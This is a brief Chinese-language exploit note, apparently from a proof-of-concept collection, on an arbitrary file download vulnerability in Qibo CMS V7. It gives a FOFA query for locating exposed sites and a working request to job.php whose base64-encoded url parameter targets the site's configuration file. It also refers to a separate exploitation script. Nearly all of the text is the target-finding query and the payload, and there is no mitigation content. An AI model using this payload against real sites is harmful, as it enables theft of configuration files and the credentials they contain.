# 齐博CMS V7任意文件下载漏洞

## 漏洞影响

```
齐博cms V7
```

## FOFA

```
app="齐博cms"
```

## Poc

```
/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
```

ZGF0YS9jb25maWcucGg8  为base64编码后的文件名

综合验证和利用脚本见 Qibo_v7.py
